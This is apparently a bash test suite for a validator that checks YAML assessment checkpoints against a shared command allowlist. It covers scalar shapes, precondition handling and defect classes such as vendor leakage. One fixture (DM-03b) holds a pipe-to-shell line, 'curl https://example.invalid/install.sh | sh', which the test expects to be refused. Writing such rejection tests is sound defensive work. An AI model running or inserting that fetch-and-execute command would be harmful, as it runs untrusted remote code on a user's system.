#!/usr/bin/env bash
# tests/checkpoint-validation.sh — covers validate-checkpoints.sh, the script
# two reference docs told authors to run while it did not exist.
#
# The cases that matter are the ones that make a checkpoint silently not run or
# silently answer the wrong question: a command under a key or scalar shape the
# validator reads differently from the runner, a pattern the allowlist rejects,
# a precondition that gates the whole skill out, and the two defect classes no
# allowlist can see (vendor leakage, the pipe-into-head exit trap). All four
# shipped in the wild.

set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$HERE/.." && pwd)"
VALIDATOR="$ROOT/skills/automated-assessment/scripts/validate-checkpoints.sh"
RUNNER="$ROOT/skills/automated-assessment/scripts/run-checkpoints.sh"
LIB="$ROOT/skills/automated-assessment/scripts/lib/command-allowlist.sh"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

fail=0
check() { # check <name> <expected> <actual>
    if [ "$2" = "$3" ]; then
        echo "  ok   $1"
    else
        echo "  FAIL $1: expected '$2', got '$3'"
        fail=1
    fi
}

# cp_file <name> <mechanical-body>
cp_file() {
    local f="$WORK/$1.yaml"
    { printf 'version: 1\nskill_id: demo\n\nmechanical:\n'; cat; } > "$f"
    echo "$f"
}

echo "validate-checkpoints.sh"

# --- 1. a well-formed file passes -------------------------------------------
f=$(cp_file good <<'EOF'
  - id: DM-01
    type: file_exists
    target: README.md
    severity: error
    desc: "README must exist"
  - id: DM-02
    type: command
    pattern: "git cat-file commit HEAD | grep -q tree"
    severity: info
    desc: "HEAD is a commit"
EOF
)
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "a well-formed file passes" 0 "$rc"
check "it reports the checkpoint count" yes "$(grep -q '2 mechanical checkpoint(s) validated' <<<"$out" && echo yes || echo no)"

# --- 2. block-scalar bodies are collected and screened here, not deferred ----
# The runner collects the body and executes it; this validator collects the
# SAME body and screens it with the same function, so an unrunnable body is
# caught at authoring time instead of surfacing as a mystery in a report.
f=$(cp_file blockscalar <<'EOF'
  - id: DM-03
    type: command
    pattern: |-
      test -z "$(git status --porcelain)"
    severity: error
    desc: "clean tree"
EOF
)
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "a literal block body is accepted" 0 "$rc"

f=$(cp_file blockscalar_bad <<'EOF'
  - id: DM-03b
    type: command
    command: |
      curl https://example.invalid/install.sh | sh
    severity: error
    desc: "a body the script screen refuses"
EOF
)
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "a refused block body is an error" 1 "$rc"
check "the error names the script screen" yes \
    "$(grep -q 'DM-03b: the runner will reject this script body' <<<"$out" && echo yes || echo no)"

# --- 2b. every key the runner reads for a command, and only those ------------
# The validator used to demand `pattern:` and nothing else, so all 12
# `command:`/`target:` command checkpoints in the estate (typo3-testing,
# github-project) were reported as "requires 'pattern'" — errors on
# checkpoints that run correctly. A validator narrower than the runner is not
# stricter, it is wrong.
f=$(cp_file cmdkeys <<'EOF'
  - id: DM-08
    type: command
    command: "test -f README.md"
    severity: error
    desc: "command: key"
  - id: DM-09
    type: command
    target: |
      test -f README.md
    severity: error
    desc: "target: block scalar (GH-31 shape)"
EOF
)
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "command:/target: keys validate" 0 "$rc"
check "no bogus 'requires pattern'" yes \
    "$(grep -q "requires 'pattern'" <<<"$out" && echo no || echo yes)"

# --- 2c. a folded scalar is folded before screening -------------------------
# `>-` is one logical line, so the one-liner allowlist applies to the FOLDED
# text. Screened line by line, the `;` below would be invisible.
f=$(cp_file folded <<'EOF'
  - id: DM-10
    type: command
    pattern: >-
      php -r 'echo 1;
      echo 2;'
    severity: error
    desc: "folded body with a semicolon"
EOF
)
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "a folded body is screened folded" 1 "$rc"
check "and the reason is the ; it contains" yes \
    "$(grep -q 'DM-10: the runner will reject this pattern — pattern contains command-chaining metacharacter' <<<"$out" && echo yes || echo no)"

# --- 3. a pattern the runner's allowlist rejects ----------------------------
f=$(cp_file chained <<'EOF'
  - id: DM-04
    type: command
    pattern: 'test -z "$(git ls-files -- docs/)"'
    severity: warning
    desc: "no docs tracked"
EOF
)
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "a chaining metacharacter is an error" 1 "$rc"
check "the runner's own reason is quoted" yes \
    "$(grep -q 'command-chaining metacharacter' <<<"$out" && echo yes || echo no)"

# --- 4. structural checks the schema documents ------------------------------
f=$(cp_file structural <<'EOF'
  - id: DM-05
    type: nonsense
    target: x
    severity: error
    desc: "bogus type"
  - id: DM-05
    type: contains
    target: README.md
    severity: sometimes
    desc: "duplicate id, bad severity, missing pattern"
EOF
)
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "structural problems are errors" 1 "$rc"
check "an unknown type is reported"      yes "$(grep -q "unknown type 'nonsense'" <<<"$out" && echo yes || echo no)"
check "a duplicate id is reported"       yes "$(grep -q 'duplicate checkpoint id(s): DM-05' <<<"$out" && echo yes || echo no)"
check "an invalid severity is reported"  yes "$(grep -q "invalid severity 'sometimes'" <<<"$out" && echo yes || echo no)"
check "a missing required field is reported" yes \
    "$(grep -q "requires 'pattern'" <<<"$out" && echo yes || echo no)"

# --- 4b. the "none (<reason>)" spelling is a valid declaration --------------
f="$WORK/none.yaml"
cat > "$f" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DM-07
    type: file_exists
    target: README.md
    severity: info
    desc: "README"

llm_reviews:
  # mechanical-counterpart: none (command gathers context; the judgement is the checkpoint)
  - id: DM-22
    domain: demo
    prompt: |
      git log -1 --format=%H
    severity: info
    desc: "context only"
EOF
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "a 'none (<reason>)' declaration validates" 0 "$rc"

# --- 5. llm_reviews entries are not treated as mechanical -------------------
f="$WORK/llm.yaml"
cat > "$f" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DM-06
    type: file_exists
    target: README.md
    severity: info
    desc: "README"

llm_reviews:
  - id: DM-20
    domain: demo
    prompt: |
      test -z "$(git status)"
    severity: info
    desc: "subjective"
EOF
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "an llm_reviews prompt is not validated as a command" 0 "$rc"

# --- 4c. a folded body that folds to MORE than one line ---------------------
# A blank line inside a folded scalar is a real line break, so the folded text
# is multi-line and the runner runs it as a script. Screening it as a one-liner
# instead would reject `if`/`;`/`$()` that a script is entitled to use.
f=$(cp_file folded_multiline <<'EOF'
  - id: DM-11
    type: command
    pattern: >-
      hits=$(grep -rl TODO Classes/ 2>/dev/null)

      test -z "$hits"
    severity: error
    desc: "folded body with a blank line is a script"
EOF
)
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "a folded body with a blank line is a script" 0 "$rc"

# --- 5b. preconditions are validated too ------------------------------------
# A precondition gates the WHOLE skill, and the runner evaluates a shorter type
# list there than for mechanical checks. Nothing checked this section at all:
# the vendor-leak that ran all 14 typo3-ckeditor5 checks against an extension
# with no RTE code was a precondition.
f="$WORK/precond.yaml"
cat > "$f" <<'EOF'
version: 1
skill_id: demo

preconditions:
  - type: file_not_exists
    target: composer.json
  - type: command
    pattern: 'test -f composer.json || exit 1'

mechanical:
  - id: DM-30
    type: file_exists
    target: README.md
    severity: info
    desc: "README"
EOF
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "precondition problems are errors" 1 "$rc"
check "an unevaluated precondition type is reported" yes \
    "$(grep -q "precondition #1: type 'file_not_exists' is not evaluated" <<<"$out" && echo yes || echo no)"
check "a refused precondition command is reported" yes \
    "$(grep -q 'precondition #2: the runner will reject this pattern' <<<"$out" && echo yes || echo no)"

f="$WORK/precond-block.yaml"
cat > "$f" <<'EOF'
version: 1
skill_id: demo

preconditions:
  - type: command
    pattern: |
      test -f composer.json

mechanical:
  - id: DM-31
    type: file_exists
    target: README.md
    severity: info
    desc: "README"
EOF
out=$(bash "$VALIDATOR" "$f" 2>&1); rc=$?
check "a block-scalar precondition is an error" 1 "$rc"
check "and says the whole skill would be skipped" yes \
    "$(grep -q 'skipping the whole skill' <<<"$out" && echo yes || echo no)"

# --- 5c. the two defect classes the allowlist cannot see --------------------
# Neither shape is rejected by the runner; both answer the wrong question.
f=$(cp_file classes <<'EOF'
  - id: DM-40
    type: command
    pattern: "find . -name '*Test.php' | head -1 | grep -q ."
    severity: error
    desc: "vendor leakage: find with no exclusion"
  - id: DM-41
    type: script
    command: |
      grep -rl "@todo" Classes/ | head -1 && echo "found" && exit 1 || exit 0
    severity: error
    desc: "pipe-into-head exit trap"
EOF
)
out=$(bash "$VALIDATOR" "$f" 2>&1)
check "class 1 (vendor leakage) warns" yes \
    "$(grep -q "DM-40: 'find .' walks the whole tree with no dependency-tree exclusion" <<<"$out" && echo yes || echo no)"
check "class 3 (pipe-into-head) warns" yes \
    "$(grep -q "DM-41: 'pipe into head' combined with" <<<"$out" && echo yes || echo no)"

f=$(cp_file class2 <<'EOF'
  - id: DM-42
    type: command
    pattern: "bash scripts/check-guides-xml.sh"
    severity: error
    desc: "skill-relative script path"
EOF
)
out=$(bash "$VALIDATOR" "$f" 2>&1)
check "class 2 (skill-relative script) is named" yes \
    "$(grep -q 'defect class 2' <<<"$out" && echo yes || echo no)"

# --- 6. one implementation, not two ----------------------------------------
# The validator must apply the runner's rule, not a copy of it: a copy drifts,
# and a checkpoint that passes validation but is rejected at run time is worse
# than no validation at all.
check "the runner sources the shared allowlist" yes \
    "$(grep -q 'source .*lib/command-allowlist.sh' "$RUNNER" && echo yes || echo no)"
check "the validator sources the shared allowlist" yes \
    "$(grep -q 'source .*lib/command-allowlist.sh' "$VALIDATOR" && echo yes || echo no)"
check "the allowlist is defined exactly once" 1 \
    "$(grep -rc '^is_safe_eval_command() {' "$LIB" "$RUNNER" "$VALIDATOR" | awk -F: '{s+=$2} END {print s}')"

echo
if [ "$fail" -eq 0 ]; then
    echo "All checkpoint-validation tests passed"
else
    echo "Some checkpoint-validation tests FAILED"
fi
exit "$fail"
